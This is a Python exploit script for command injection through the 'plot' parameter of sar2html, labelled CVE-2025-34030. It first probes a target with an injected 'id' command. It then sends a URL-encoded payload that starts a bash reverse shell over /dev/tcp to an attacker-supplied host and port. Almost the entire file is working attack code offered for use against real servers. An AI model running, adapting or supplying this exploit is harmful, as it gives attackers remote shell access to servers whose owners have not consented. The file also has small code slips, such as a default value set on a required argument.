"""
Exploit Title: sar2html 'plot' parameter RCE
Date: 22 August 2025
Author: FakeVapour
Tested on: Kali Linux
Platform: Ubuntu
Type: Remote
CVE: CVE-2025-34030
"""

import argparse
import requests
import sys
from urllib.parse import urlparse
from colorama import Fore, Style, init

def logSuccess(message):
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {message}")

def logInfo(message):
    print(f"{Fore.GREEN}[*]{Style.RESET_ALL} {message}")

def logWarn(message):
    print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {message}")

def logError(message):
    print(f"{Fore.RED}[-]{Style.RESET_ALL} {message}")


def main():
    # Initialize colorama (works on Windows too)
    init(autoreset=True)

    # Create parser
    parser = argparse.ArgumentParser(
        description="CVE-2025-34030 sar2html 'plot' parameter RCE.",
            epilog=(
                "Example:\n"
                "  python3 exploit.py --url http://vulnerable.com/index.php?id=test"
                "--lhost 192.168.120.24"                
            ),
            formatter_class=argparse.RawDescriptionHelpFormatter
        )

    # Add arguments
    parser.add_argument("--url", type=str, required=True, help="URL to target website (e.g: http://vulnerable.com/index.php?id=test)")
    parser.add_argument("--lhost", type=str, required=True, default=18, help="Attack local IP address.")
    parser.add_argument("--lport", type=int, default=1337, help="Attacker local port (default: 1337).")

    # Parse arguments
    args = parser.parse_args()

    url = args.url
    parsed = urlparse(url)

    target = parsed.hostname

    if parsed.port:
        port = parsed.port 
    else:
        if parsed.scheme == "https":
            port = 443
        else:
            port = 80
    
    dir = parsed.path if parsed.path else "/"
    path = "?" + parsed.query if parsed.query else ""

    lhost = args.lhost
    lport = args.lport

    urlEnd = f"{parsed.scheme}://{target}:{port}{dir}"
    
    if lport is None:
        logWarn(f"Local port defaults to: 1337")

    payload = f"%3B%20%2Fbin%2Fbash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{lhost}%2F{lport}%200%3E%261%22"

    logWarn(f"Initiating attack on: {url}")
    logInfo(f"Reverse shell handler set to: {lhost}:{lport}")
    logInfo(f"Attempting connection to target...")

    try:
        requests.get(url, timeout=10)
    except requests.exceptions.RequestException as e:
        logError(f"Connection failed: {e}") 
        sys.exit(1)

    logInfo("Target is alive attempting checks...")
    try:
        response = requests.get(urlEnd + "?plot=; id", timeout=10)
        if "www-data" in response.text.lower():
            logSuccess(f"Target is vulnerable to CVE-2025-34030!")
        else:
            logError("Target is not vulnerable to CVE-2025-34030.")
            sys.exit(1)

    except requests.exceptions.RequestException as e:
        logError(f"Connection failed: {e}")
        sys.exit(1)

    logWarn(f"Attempting to exploit target...")

    try:
        requests.get(urlEnd + f"?plot={payload}", timeout=3)

    except requests.exceptions.ReadTimeout:
        logSuccess(f"Exploit successful, check reverse shell.")
        sys.exit(0)

    except requests.exceptions.RequestException as e:
        logError(f"Connection failed: {e}")
        sys.exit(1)

    logWarn(f"Reverse shell listener not enabled.")
    sys.exit(1)

if __name__ == "__main__":
    main()
